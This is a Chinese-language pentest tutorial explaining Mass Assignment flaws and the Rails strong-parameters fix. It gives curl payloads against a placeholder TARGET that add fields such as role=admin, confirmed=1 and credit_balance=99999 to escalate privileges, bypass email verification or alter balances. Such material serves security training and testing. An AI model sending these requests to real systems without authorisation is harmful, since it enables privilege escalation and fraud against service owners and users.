## 學習目標

- 理解 Mass Assignment 的根本成因：後端把整包輸入直接映射到模型。
- 能從 HTML、JS、API 回應中找出模型存在但前端未暴露的欄位。
- 能用 curl 或 Burp 補送隱藏欄位並驗證狀態是否改變。
- 理解「前端沒有輸入框」不等於「後端不接受」。

---

## 理論基礎

```text
Mass Assignment 成因：
  框架把使用者提交的整包輸入（form / JSON body）
  直接綁定到 ORM 模型，沒有明確白名單過濾

  後端危險模式（Ruby on Rails 舊式）：
    User.create(params[:user])   ← 直接吃所有欄位
    User.update(params[:user])

  安全模式（Rails strong parameters）：
    params.require(:user).permit(:name, :email)   ← 只允許指定欄位

攻擊邏輯：
  前端只顯示 name / email 輸入框
  但模型還有 role / admin / confirmed / credit 欄位
  → 攻擊者在請求中額外補上這些欄位
  → 若後端直接 mass assign → 欄位被更新
```

| 高風險欄位 | 典型影響 |
|------------|----------|
| `admin=true` | 提升為管理員 |
| `role=admin` | 角色切換 |
| `confirmed=true` | 繞過 Email 審核 |
| `approved=1` | 繞過人工審核流程 |
| `credit=9999` | 業務數值篡改 |
| `owner_id=X` | 資源歸屬竄改 |

## 方法一：從前端和 API 回應找隱藏欄位

```bash
# 觀察 API 回應中是否洩露模型欄位（即使前端不顯示）
curl -s -H "Cookie: session=YOUR_TOKEN" \
  http://TARGET/api/profile | python3 -m json.tool
# 若回應包含 {"name":"wayne","email":"...","role":"user","confirmed":true}
# → 模型有 role 和 confirmed 欄位，前端卻沒有對應輸入框

# 查看 HTML 原始碼中的隱藏 input
curl -s http://TARGET/register | grep -i "hidden\|input"

# 查看前端 JS 送出的 API 請求（DevTools Network 或 grep JS 檔）
curl -s http://TARGET/assets/app.js | grep -i "role\|admin\|confirmed\|credit"
```

## 方法二：註冊時補送敏感欄位（審核繞過）

```bash
# 正常註冊 POST（只送 name + email + password）
curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=testuser&email=test@evil.com&password=Test1234" \
  http://TARGET/register

# Mass Assignment：補送 confirmed=1 繞過 Email 審核
curl -s -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=testuser&email=test2@evil.com&password=Test1234&confirmed=1" \
  http://TARGET/register
# 若可直接登入而不需要 Email 確認 → Mass Assignment 成立

# JSON body 版本
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"name":"testuser","email":"test3@evil.com","password":"Test1234","confirmed":true}' \
  http://TARGET/api/register
```

## 方法三：更新個資時提升角色

```bash
# 正常 PUT 更新個資（只送 name + email）
curl -s -X PUT \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"wayne","email":"wayne@example.com"}' \
  http://TARGET/api/profile

# Mass Assignment：補送 role=admin
curl -s -X PUT \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"wayne","email":"wayne@example.com","role":"admin"}' \
  http://TARGET/api/profile
# 成功後重新查看 profile，看 role 是否變成 admin

# 驗證是否生效
curl -s -H "Cookie: session=YOUR_TOKEN" \
  http://TARGET/api/profile | python3 -m json.tool
# 若 "role": "admin" → 提權成功
```

## 方法四：逐一測試欄位（一次只加一個）

```bash
# 原則：每次只補一個欄位，方便確認是哪個欄位生效

# 測試 admin=true
curl -s -X PUT \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"wayne","admin":true}' \
  http://TARGET/api/profile

# 測試 is_staff=true
curl -s -X PUT \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"wayne","is_staff":true}' \
  http://TARGET/api/profile

# 測試 credit_balance（業務數值）
curl -s -X PUT \
  -H "Cookie: session=YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"wayne","credit_balance":99999}' \
  http://TARGET/api/profile

# 每次測試後立即驗證
curl -s -H "Cookie: session=YOUR_TOKEN" \
  http://TARGET/api/profile | python3 -m json.tool
```

## 方法五：用兩帳號對照確認效果

```bash
# 帳號 A（一般使用者）嘗試提權
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"userA","password":"Pass1234","role":"admin"}' \
  http://TARGET/api/register

# 登入帳號 A 取得 session token
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"userA","password":"Pass1234"}' \
  http://TARGET/api/login

# 存取僅限管理員的端點，確認是否可進入
curl -s -H "Cookie: session=ACCOUNT_A_TOKEN" \
  http://TARGET/api/admin/users
# 200 → 提權成功（Mass Assignment + 授權控制缺失）
# 403 → 後端有額外授權控制（但欄位可能仍被接受，只是沒完整升級）
```

## 決策流程

```
找到寫入端點：註冊 / 個資更新 / 物件建立 / 編輯
    ↓
從 API 回應、HTML、JS 找模型可能存在的欄位
    ↓
標記敏感欄位：role / admin / confirmed / owner_id
    ↓
每次只補送一個額外欄位
    ↓
查看回應碼是否異常（400 欄位錯誤 vs 200 接受）
    ↓
查看後續狀態（profile 頁面、管理員功能、資料庫值）
    ↓
欄位被接受且狀態改變 → Mass Assignment 成立
```
